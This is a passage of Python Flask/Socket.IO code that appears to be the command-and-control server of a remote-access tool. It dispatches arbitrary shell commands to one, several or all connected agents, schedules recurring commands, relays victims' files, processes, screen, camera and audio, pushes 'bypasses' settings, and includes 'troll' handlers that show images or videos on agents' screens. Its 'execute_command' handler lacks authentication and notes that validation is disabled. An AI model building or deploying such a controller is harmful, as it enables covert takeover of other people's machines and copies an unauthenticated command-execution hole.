            'details': 'High quality stream initiated',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=2)).isoformat() + 'Z',
            'status': 'info'
        },
        {
            'id': 'act-003',
            'type': 'command',
            'action': 'Command Executed',
            'details': 'systeminfo command completed successfully',
            'agent_id': 'agent-002',
            'agent_name': 'Linux-Server-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(minutes=3)).isoformat() + 'Z',
            'status': 'success'
        }
    ]
    
    # Filter by type if specified
    if activity_type != 'all':
        activities = [a for a in activities if a['type'] == activity_type]
    
    # Limit results
    activities = activities[:limit]
    
    return jsonify({
        'activities': activities,
        'total_count': len(activities),
        'filter': activity_type
    })

# Quick Actions API
@app.route('/api/actions/bulk', methods=['POST'])
@require_auth
def execute_bulk_action():
    """Execute a bulk action on multiple agents"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    action = request.json.get('action')
    agent_ids = request.json.get('agent_ids', [])
    
    if not action:
        return jsonify({'error': 'Action is required'}), 400
    
    # If no specific agents provided, apply to all online agents
    if not agent_ids:
        agent_ids = [aid for aid, data in AGENTS_DATA.items() if data.get('sid')]
    
    results = []
    for agent_id in agent_ids:
        if agent_id in AGENTS_DATA:
            agent_sid = AGENTS_DATA[agent_id].get('sid')
            if agent_sid:
                # Emit action as a command for agent-side handling
                socketio.emit('command', {
                    'command': str(action),
                    'execution_id': f"bulk_{int(time.time())}_{secrets.token_hex(4)}"
                }, room=agent_sid)
                
                results.append({
                    'agent_id': agent_id,
                    'status': 'sent',
                    'message': f'Action {action} sent to agent'
                })
            else:
                results.append({
                    'agent_id': agent_id,
                    'status': 'failed',
                    'message': 'Agent not connected'
                })
        else:
            results.append({
                'agent_id': agent_id,
                'status': 'failed',
                'message': 'Agent not found'
            })
    
    return jsonify({
        'success': True,
        'action': action,
        'results': results,
        'total_agents': len(agent_ids),
        'successful': len([r for r in results if r['status'] == 'sent'])
    })

def execute_command_internal(agent_id: str, command: str):
    if agent_id not in AGENTS_DATA:
        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not found'}
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not connected'}
    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
    ok, msg = validate_command(command, platform)
    if not ok:
        return {'agent_id': agent_id, 'status': 'blocked', 'message': msg}
    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
    payload = {'execution_id': execution_id}
    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
    if shared_secret:
        try:
            e2e = E2EEncryption(agent_id, shared_secret)
            payload['command'] = e2e.encrypt(command)
            payload['encrypted'] = True
        except Exception:
            payload['command'] = command
    else:
        payload['command'] = command
    socketio.emit('command', payload, room=agent_sid)
    return {'agent_id': agent_id, 'status': 'sent', 'execution_id': execution_id}

def parse_cron_expression(expr: str):
    parts = (expr or '* * * * *').split()
    while len(parts) < 5:
        parts.append('*')
    keys = ['minute', 'hour', 'day', 'month', 'day_of_week']
    return {k: parts[i] for i, k in enumerate(keys)}

scheduler = BackgroundScheduler()
scheduler.start()

@app.route('/api/tasks/schedule', methods=['POST'])
@require_auth
def schedule_task():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    cron = str(data.get('cron', '* * * * *'))
    if not agent_id or not command:
        return jsonify({'error': 'agent_id and command are required'}), 400
    trigger_kwargs = parse_cron_expression(cron)
    job_id = f"task_{agent_id}_{int(time.time())}"
    scheduler.add_job(func=execute_command_internal, trigger='cron', args=[agent_id, command], id=job_id, **trigger_kwargs)
    return jsonify({'success': True, 'job_id': job_id})

@app.route('/api/groups/<int:group_id>/execute', methods=['POST'])
@require_auth
def execute_on_group(group_id):
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    command = request.json.get('command')
    db = get_db()
    memberships = db.query(DbAgentGroupMembership).filter(DbAgentGroupMembership.group_id == group_id).all()
    db.close()
    results = []
    for m in memberships:
        r = execute_command_internal(m.agent_id, command or '')
        results.append(r)
    return jsonify({'results': results})

if LIMITER_AVAILABLE:
    pass

# Search and Filter API
@app.route('/api/agents/search', methods=['GET'])
@require_auth
def search_agents():
    """Search and filter agents"""
    search_term = str(sanitize_input(request.args.get('q', ''))).lower()
    status_filter = sanitize_input(request.args.get('status'))
    platform_filter = sanitize_input(request.args.get('platform'))
    capability_filter = sanitize_input(request.args.get('capability'))
    
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }
        
        # Apply filters
        if search_term:
            if not (search_term in agent_info['name'].lower() or 
                   search_term in agent_info['platform'].lower() or 
                   search_term in agent_info['ip']):
                continue
        
        if status_filter and agent_info['status'] != status_filter:
            continue
        
        if platform_filter and platform_filter.lower() not in agent_info['platform'].lower():
            continue
        
        if capability_filter and capability_filter not in agent_info['capabilities']:
            continue
        
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'filters': {
            'search': search_term,
            'status': status_filter,
            'platform': platform_filter,
            'capability': capability_filter
        }
    })

# Settings Management API
@app.route('/api/settings', methods=['GET'])
@require_auth
def get_settings():
    """Get current system settings (merged with defaults)."""
    current = load_settings()
    # Redact sensitive values
    safe = json.loads(json.dumps(current))
    try:
        if 'authentication' in safe:
            # Do not return admin password; apiKey can be returned if enabled
            if 'adminPassword' in safe['authentication']:
                safe['authentication']['adminPassword'] = ''
            # Mask API key partially
            api = safe['authentication'].get('apiKey')
            if api:
                safe['authentication']['apiKey'] = api[:4] + "***" + api[-4:]
            if 'trustedDevices' in safe['authentication']:
                safe['authentication']['trustedDevices'] = []
        if 'email' in safe and 'password' in safe['email']:
            safe['email']['password'] = ''
    except Exception as e:
        print(f"Warning redacting settings: {e}")
    return jsonify(safe)

if LIMITER_AVAILABLE:
    pass

@app.route('/api/security/blocked_ips', methods=['GET'])
@require_auth
def get_blocked_ips():
    s = load_settings().get('security', {})
    ips = s.get('blocked_ips') or []
    return jsonify({'blocked_ips': ips, 'count': len(ips)})

@app.route('/api/security/blocked_ips', methods=['POST'])
@require_auth
def update_blocked_ips():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    incoming = request.json.get('blocked_ips')
    if not isinstance(incoming, list):
        return jsonify({'error': 'blocked_ips must be an array'}), 400
    validated = []
    try:
        import ipaddress
        for entry in incoming:
            if not isinstance(entry, str):
                continue
            e = entry.strip()
            if not e:
                continue
            try:
                if '/' in e:
                    ipaddress.ip_network(e, strict=False)
                    validated.append(e)
                else:
                    ipaddress.ip_address(e)
                    validated.append(e)
            except Exception:
                continue
    except Exception:
        pass
    current = load_settings()
    sec = current.get('security', {})
    sec['blocked_ips'] = sorted(list(set(validated)))
    current['security'] = sec
    if not save_settings(current):
        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500
    return jsonify({'success': True, 'blocked_ips': sec['blocked_ips'], 'count': len(sec['blocked_ips'])})

@app.route('/api/settings', methods=['POST'])
@require_auth
def update_settings():
    """Update system settings and persist to settings.json. Some changes may need restart."""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    incoming = request.json
    current = load_settings()
    updated = _deep_update(current, incoming)
    if not save_settings(updated):
        return jsonify({'success': False, 'message': 'Failed to save settings'}), 500

    # Apply a subset live where safe (e.g., WebRTC toggles)
    try:
        if 'webrtc' in incoming:
            webrtc = incoming['webrtc']
            if 'enabled' in webrtc:
                WEBRTC_CONFIG['enabled'] = bool(webrtc['enabled'])
            if 'iceServers' in webrtc:
                WEBRTC_CONFIG['ice_servers'] = webrtc['iceServers']
    except Exception as e:
        print(f"Warning applying live settings: {e}")

    # Determine if restart is required for certain keys
    restart_required = False
    critical_paths = [
        ('server', 'serverPort'),
        ('server', 'sslEnabled'),
        ('security', 'frontendOrigins')
    ]
    for sect, key in critical_paths:
        if sect in incoming and key in incoming.get(sect, {}):
            restart_required = True
            break
    # Notify all connected agents of new config
    try:
        for _agent_id, _data in AGENTS_DATA.items():
            if _data.get('sid'):
                _emit_agent_config(_agent_id)
    except Exception:
        pass
    return jsonify({'success': True, 'message': 'Settings saved.', 'restart_required': restart_required})

if LIMITER_AVAILABLE:
    pass

@app.route('/api/settings/reset', methods=['POST'])
@require_auth
def reset_settings():
    """Reset settings to default values"""
    defaults = json.loads(json.dumps(DEFAULT_SETTINGS))
    if not save_settings(defaults):
        return jsonify({'success': False, 'message': 'Failed to reset settings'}), 500
    # Apply a safe subset immediately
    WEBRTC_CONFIG['enabled'] = defaults['webrtc']['enabled']
    WEBRTC_CONFIG['ice_servers'] = defaults['webrtc']['iceServers']
    return jsonify({'success': True, 'message': 'Settings reset to defaults'})

# System Information API
@app.route('/api/system/info', methods=['GET'])
@require_auth
def get_system_info():
    """Get system information and status"""
    import platform
    
    # Base server info (always available)
    info = {
        'server': {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'python_version': platform.python_version()
        },
        'webrtc': {
            'available': WEBRTC_AVAILABLE,
            'active_connections': len(WEBRTC_PEER_CONNECTIONS),
            'active_streams': len(WEBRTC_STREAMS),
            'active_viewers': len(WEBRTC_VIEWERS)
        },
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len([a for a in AGENTS_DATA.values() if a.get('sid')]),
            'platforms': list(set([data.get('platform', 'Unknown') for data in AGENTS_DATA.values()]))
        }
    }
    
    # Try to add performance info if psutil is available
    try:
        import psutil
        
        # Get detailed system information
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Get CPU information
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        cpu_freq_ghz = round(cpu_freq.current / 1000, 2) if cpu_freq else 0
        
        # Get memory information in GB
        memory_total_gb = round(memory.total / (1024**3), 1)
        memory_used_gb = round(memory.used / (1024**3), 1)
        memory_available_gb = round(memory.available / (1024**3), 1)
        
        # Get disk information in GB
        disk_total_gb = round(disk.total / (1024**3), 1)
        disk_used_gb = round(disk.used / (1024**3), 1)
        disk_free_gb = round(disk.free / (1024**3), 1)
        
        # Get network information
        network_io = psutil.net_io_counters()
        network_upload_mb = round(network_io.bytes_sent / (1024**2), 1)
        network_download_mb = round(network_io.bytes_recv / (1024**2), 1)
        
        info['performance'] = {
            'cpu_percent': cpu_percent,
            'cpu_cores': cpu_count,
            'cpu_frequency_ghz': cpu_freq_ghz,
            'memory_percent': memory.percent,
            'memory_total_gb': memory_total_gb,
            'memory_used_gb': memory_used_gb,
            'memory_available_gb': memory_available_gb,
            'disk_percent': round((disk.used / disk.total) * 100, 1),
            'disk_total_gb': disk_total_gb,
            'disk_used_gb': disk_used_gb,
            'disk_free_gb': disk_free_gb,
            'network_upload_mb': network_upload_mb,
            'network_download_mb': network_download_mb,
            'boot_time': psutil.boot_time()
        }
    except ImportError:
        # psutil not available, provide placeholder data
        info['performance'] = {
            'cpu_percent': 0,
            'cpu_cores': 0,
            'cpu_frequency_ghz': 0,
            'memory_percent': 0,
            'memory_total_gb': 0,
            'memory_used_gb': 0,
            'memory_available_gb': 0,
            'disk_percent': 0,
            'disk_total_gb': 0,
            'disk_used_gb': 0,
            'disk_free_gb': 0,
            'network_upload_mb': 0,
            'network_download_mb': 0,
            'boot_time': 0,
            'error': 'psutil not available'
        }
    except Exception as e:
        # Other psutil errors (permissions, etc.)
        info['performance'] = {
            'cpu_percent': 0,
            'memory_percent': 0,
            'disk_percent': 0,
            'boot_time': 0,
            'error': f'Performance data unavailable: {str(e)}'
        }
    
    return jsonify(info)

@app.route('/api/debug/agents', methods=['GET'])
@require_auth
def debug_agents():
    """Debug endpoint to see raw agent data"""
    return jsonify({
        'agents_data': AGENTS_DATA,
        'agent_count': len(AGENTS_DATA),
        'agent_keys': list(AGENTS_DATA.keys())
    })

@app.route('/api/debug/broadcast-agents', methods=['POST'])
@require_auth
def broadcast_agents():
    """Manually broadcast agent list to all operators"""
    try:
        socketio.emit('agent_list_update', _agents_payload(), room='operators')
        return jsonify({
            'success': True,
            'message': f'Agent list broadcast to operators room',
            'agent_count': len(AGENTS_DATA),
            'agents': list(AGENTS_DATA.keys())
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Video/Audio Frame Storage
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    client_info = {
        'sid': request.sid,
        'remote_addr': request.environ.get('REMOTE_ADDR', 'unknown'),
        'user_agent': request.environ.get('HTTP_USER_AGENT', 'unknown')
    }
    print(f"Client connected: {client_info}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    disconnected_agent_name = None
    
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            disconnected_agent_name = data.get("name", f"Agent-{agent_id}")
            break
    
    if disconnected_agent_id:
        try:
            AGENTS_DATA[disconnected_agent_id]["sid"] = None
        except Exception:
            pass
        emit('agent_list_update', _agents_payload(), room='operators')
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Disconnected',
            'details': f'Agent {disconnected_agent_id} disconnected',
            'agent_id': disconnected_agent_id,
            'agent_name': disconnected_agent_name,
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'warning'
        }, room='operators')
        
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")
    try:
        if disconnected_agent_id:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyAgentOffline'):
                send_email_notification(
                    "Agent Disconnected",
                    f"Agent {disconnected_agent_name} ({disconnected_agent_id}) disconnected."
                )
    except Exception:
        pass

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    print(f"Operator dashboard connecting with SID: {request.sid}")
    join_room('operators')
    print(f"Operator joined 'operators' room. Sending {len(AGENTS_DATA)} agents to new operator.")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    
    # Send agent list to the specific operator that just connected
    emit('agent_list_update', _agents_payload(), room=request.sid)
    # Confirm room joining
    emit('joined_room', 'operators', room=request.sid)

@socketio.on('join_room')
@require_socket_auth
def handle_join_room(room_name):
    """Handle explicit room joining requests."""
    print(f"🔍 Controller: Client {request.sid} requesting to join room: {room_name}")
    join_room(room_name)
    print(f"🔍 Controller: Client {request.sid} joined room: {room_name}")
    emit('joined_room', room_name, room=request.sid)
    
    # If joining operators room, also send agent list
    if room_name == 'operators':
        emit('agent_list_update', _agents_payload(), room=request.sid)
        print(f"Agent list sent to operator {request.sid}")

def _emit_agent_config(agent_id: str):
    try:
        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
        if not agent_sid:
            return
        s = load_settings()
        payload = {
            'agent': s.get('agent', {}),
            'bypasses': s.get('bypasses', {}),
            'registry': s.get('registry', {})
        }
        emit('config_update', payload, room=agent_sid)
        try:
            ops_payload = {
                'agent': {'id': agent_id, **(payload.get('agent') or {})},
                'bypasses': payload.get('bypasses') or {},
                'registry': payload.get('registry') or {},
            }
            emit('config_update', ops_payload, room='operators')
        except Exception:
            pass
    except Exception:
        pass

@socketio.on('operator_toggle_feature')
@require_socket_auth
def handle_operator_toggle_feature(data):
    try:
        feature = str((data or {}).get('feature') or '').strip()
        enabled = bool((data or {}).get('enabled'))
        agent_id = (data or {}).get('agent_id')
        ts = datetime.datetime.utcnow().isoformat() + 'Z'
        if agent_id:
            AGENT_FEATURE_FLAGS[agent_id][f'{feature}_enabled'] = enabled
            AGENT_FEATURE_FLAGS[agent_id]['last_updated'] = ts
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room=sid)
        else:
            emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room='agents')
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'toggle',
            'action': f'{feature}:{("on" if enabled else "off")}',
            'details': f'{feature} {"enabled" if enabled else "disabled"}',
            'timestamp': ts,
            'status': 'success'
        }, room='operators')
    except Exception as e:
        print(f"Error handling operator_toggle_feature: {e}")
    except Exception:
        pass

@socketio.on('troll_show_image')
@require_socket_auth
def handle_troll_show_image(data):
    try:
        agent_id = (data or {}).get('agent_id')
        payload = {
            'filename': (data or {}).get('filename'),
            'mime': (data or {}).get('mime'),
            'image_b64': (data or {}).get('image_b64'),
            'duration_ms': int((data or {}).get('duration_ms') or 5000),
            'mode': (data or {}).get('mode') or 'cover'
        }
        if agent_id:
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('troll_show_image', payload, room=sid)
                # Also emit to operators room for frontend notifications
                emit('troll_show_image', {**payload, 'agent_id': agent_id}, room='operators')
        else:
            emit('troll_show_image', payload, room='agents')
            # Also emit to operators room for frontend notifications
            emit('troll_show_image', payload, room='operators')
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'troll',
            'action': 'show_image',
            'details': payload.get('filename') or '',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators')
    except Exception:
        pass

@socketio.on('troll_show_video')
@require_socket_auth
def handle_troll_show_video(data):
    try:
        agent_id = (data or {}).get('agent_id')
        payload = {
            'filename': (data or {}).get('filename'),
            'mime': (data or {}).get('mime'),
            'video_b64': (data or {}).get('video_b64'),
            'duration_ms': int((data or {}).get('duration_ms') or 8000),
        }
        if agent_id:
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('troll_show_video', payload, room=sid)
                # Also emit to operators room for frontend notifications
                emit('troll_show_video', {**payload, 'agent_id': agent_id}, room='operators')
        else:
            emit('troll_show_video', payload, room='agents')
            # Also emit to operators room for frontend notifications
            emit('troll_show_video', payload, room='operators')
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'troll',
            'action': 'show_video',
            'details': payload.get('filename') or '',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators')
    except Exception:
        pass

@socketio.on('request_agent_list')
@require_socket_auth
def handle_request_agent_list():
    """Handle explicit request for agent list from dashboard"""
    print(f"Agent list requested by {request.sid}")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    print(f"Agent data: {AGENTS_DATA}")
    emit('agent_list_update', _agents_payload(), room=request.sid)
    print(f"Agent list sent to {request.sid}")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_connect data received: {data}")
            return
            
        agent_id = data.get('agent_id')
        if not agent_id:
            print("Agent connection attempt without agent_id")
            return
        if AGENT_AUTH_REQUIRED:
            token = data.get('token')
            if not verify_agent_token(agent_id, token or ''):
                emit('registration_error', {'message': 'Invalid agent token'}, room=request.sid)
                return
        
        ip_for_check = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        if ip_for_check and is_ip_blocked(ip_for_check.split(',')[0].strip()):
            emit('registration_error', {'message': 'Blocked IP'}, room=request.sid)
            return
        
        # Store agent information
        # Create agent entry if it doesn't exist
        if agent_id not in AGENTS_DATA:
            AGENTS_DATA[agent_id] = {}
            
        AGENTS_DATA[agent_id]["sid"] = request.sid
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
        AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
        AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        AGENTS_DATA[agent_id]["is_admin"] = data.get('is_admin', False)
        AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
        AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
        try:
            raw_alias = data.get('alias')
            alias = sanitize_input(str(raw_alias or '').strip())
            if alias:
                AGENTS_DATA[agent_id]['alias'] = alias
                try:
                    base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
                    os.makedirs(base_dir, exist_ok=True)
                    with open(os.path.join(base_dir, 'alias'), 'w', encoding='utf-8') as f:
                        f.write(alias)
                except Exception:
                    pass
            else:
                existing_alias = _load_agent_alias(agent_id)
                if existing_alias:
                    AGENTS_DATA[agent_id]['alias'] = existing_alias
                else:
                    try:
                        if 'alias' in AGENTS_DATA.get(agent_id, {}):
                            del AGENTS_DATA[agent_id]['alias']
                    except Exception:
                        pass
        except Exception:
            pass
        try:
            AGENT_OVERRIDES['admin'][agent_id] = bool(AGENTS_DATA[agent_id]["is_admin"])
        except Exception:
            pass
        try:
            socketio.emit('agent_privilege_update', {
                'agent_id': agent_id,
                'is_admin': bool(AGENTS_DATA[agent_id]["is_admin"]),
                'timestamp': time.time()
            }, room='operators')
        except Exception:
            pass
        
        join_room('agents')
        
        try:
            db = get_db()
            existing = db.query(DbAgent).filter(DbAgent.id == agent_id).first()
            if not existing:
                a = DbAgent(
                    id=agent_id,
                    name=AGENTS_DATA[agent_id]["name"],
                    platform=AGENTS_DATA[agent_id]["platform"],
                    ip=AGENTS_DATA[agent_id]["ip"],
                    last_seen=datetime.datetime.utcnow(),
                    capabilities=AGENTS_DATA[agent_id]["capabilities"],
                    metadata_json=AGENTS_DATA[agent_id].get("system_info", {})
                )
                db.add(a)
            else:
                existing.name = AGENTS_DATA[agent_id]["name"]
                existing.platform = AGENTS_DATA[agent_id]["platform"]
                existing.ip = AGENTS_DATA[agent_id]["ip"]
                existing.last_seen = datetime.datetime.utcnow()
                existing.capabilities = AGENTS_DATA[agent_id]["capabilities"]
                existing.metadata_json = AGENTS_DATA[agent_id].get("system_info", {})
            db.commit()
            db.close()
        except Exception:
            pass
        
        # Notify all operators of the new agent
        emit('agent_list_update', _agents_payload(), room='operators')
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully connected',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators')
        print(f"Agent {agent_id} connected with SID {request.sid}")
        print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
        try:
            _emit_agent_config(agent_id)
        except Exception:
            pass
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyAgentOnline'):
                send_email_notification(
                    "Agent Connected",
                    f"Agent {AGENTS_DATA[agent_id]['name']} ({agent_id}) connected from {AGENTS_DATA[agent_id]['ip']}."
                )
        except Exception:
            pass
    except Exception as e:
        print(f"Error handling agent_connect: {e}")
        emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
    # Validation disabled per user request
    print(f"🔍 Controller: execute_command received for agent {agent_id}, command: {command}")
    print(f"🔍 Controller: Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        # Generate execution ID for tracking
        execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
        payload = {'execution_id': execution_id}
        shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
        if shared_secret:
            try:
                e2e = E2EEncryption(agent_id, shared_secret)
                payload['command'] = e2e.encrypt(str(command or ''))
                payload['encrypted'] = True
            except Exception:
                payload['command'] = command
        else:
            payload['command'] = command
        emit('command', payload, room=agent_sid)
        print(f"🔍 Controller: Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
        try:
            audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
        except Exception:
            pass
    else:
        print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('execute_command_all')
@require_socket_auth
def handle_execute_command_all(data):
    """
    Dispatch the same command to many agents concurrently.
    - data: { command: str, agent_ids?: [str] }
    If agent_ids is empty/missing, targets all ONLINE agents.
    """
    try:
        command = str((data or {}).get('command') or '').strip()
        if not command:
            emit('status_update', {'message': 'No command provided', 'type': 'error'}, room=request.sid)
            return
        # Resolve targets
        target_ids = list((data or {}).get('agent_ids') or [])
        if not target_ids:
            target_ids = [aid for aid, info in AGENTS_DATA.items() if info.get('sid')]
        # Launch concurrent dispatches
        for aid in target_ids:
            def _task(agent_id=aid, cmd=command):
                try:
                    execute_command_internal(agent_id, cmd)
                except Exception:
                    pass
            try:
                socketio.start_background_task(_task)
            except Exception:
                # Fallback to threading if async mode differs
                try:
                    threading.Thread(target=_task, daemon=True).start()
                except Exception:
                    pass
        emit('status_update', {'message': f'Dispatched "{command}" to {len(target_ids)} agent(s)', 'type': 'info'}, room=request.sid)
    except Exception as e:
        emit('status_update', {'message': f'Bulk dispatch failed: {str(e)}', 'type': 'error'}, room=request.sid)

@socketio.on('execute_batch')
@require_socket_auth
def handle_execute_batch(data):
    """
    Dispatch a list of commands concurrently.
    - data: { commands: [{agent_id: str|'ALL', command: str}, ...] }
    If agent_id == 'ALL', expands to all ONLINE agents.
    """
    try:
        commands = list((data or {}).get('commands') or [])
        if not commands:
            emit('status_update', {'message': 'No commands to execute', 'type': 'error'}, room=request.sid)
            return
        online_ids = [aid for aid, info in AGENTS_DATA.items() if info.get('sid')]
        total = 0
        for item in commands:
            cmd = str(item.get('command') or '').strip()
            if not cmd:
                continue
            target = item.get('agent_id')
            agent_ids = []
            if target == 'ALL' or target is None:
                agent_ids = online_ids
            elif isinstance(target, str):
                agent_ids = [target]
            for aid in agent_ids:
                total += 1
                def _task(agent_id=aid, c=cmd):
                    try:
                        execute_command_internal(agent_id, c)
                    except Exception:
                        pass
                try:
                    socketio.start_background_task(_task)
                except Exception:
                    try:
                        threading.Thread(target=_task, daemon=True).start()
                    except Exception:
                        pass
        emit('status_update', {'message': f'Dispatched {total} command(s) concurrently', 'type': 'info'}, room=request.sid)
    except Exception as e:
        emit('status_update', {'message': f'Batch dispatch failed: {str(e)}', 'type': 'error'}, room=request.sid)

@socketio.on('process_list')
def handle_process_list(data):
    """Agent sends structured process list; relay to operators."""
    agent_id = data.get('agent_id')
    processes = data.get('processes', [])
    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators')

@socketio.on('process_operation_result')
def handle_process_operation_result(data):
    emit('process_operation_result', data, room='operators')

@socketio.on('process_details_response')
def handle_process_details_response(data):
    emit('process_details_response', data, room='operators')

@socketio.on('registry_presence')
def handle_registry_presence(data):
    emit('registry_presence', data, room='operators')

@socketio.on('file_list')
def handle_file_list(data):
    """Agent sends structured directory listing; relay to operators."""
    agent_id = data.get('agent_id')
    path = data.get('path', '/')
    files = data.get('files', [])
    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators')

@socketio.on('file_upload_debug')
def handle_file_upload_debug(data):
    try:
        emit('file_upload_debug', data, room='operators')
    except Exception:
        pass
@socketio.on('file_op_result')
def handle_file_op_result(data):
    """Relay file operation result to operators."""
    emit('file_op_result', data, room='operators')

@socketio.on('agent_response')
def handle_agent_response(data):
    emit('agent_response', data, room='operators')

@socketio.on('command_output')
def handle_command_output(data):
    """Agent sends back the result of a command (legacy handler)."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators')
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('get_monitors')
def handle_get_monitors(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('get_monitors', {}, room=agent_sid)

@socketio.on('monitors_list')
def handle_monitors_list(data):
    emit('monitors_list_update', data, room='operators')

@socketio.on('switch_monitor')
def handle_switch_monitor_request(data):
    agent_id = data.get('agent_id')
    monitor_index = data.get('monitor_index')
